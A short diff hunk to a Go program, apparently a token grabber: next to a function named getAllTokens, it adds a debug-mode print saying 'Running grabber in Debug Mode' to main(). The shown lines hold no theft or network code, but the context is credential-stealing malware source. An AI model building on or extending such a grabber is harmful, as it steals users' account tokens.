@@ -284,6 +284,11 @@ func getAllTokens(paths map[string]string) {
 }
 
 func main() {
+
+	if Debug {
+		fmt.Println("Running grabber in Debug Mode ...")
+	}
+
 	goos := runtime.GOOS
 
 	switch goos {
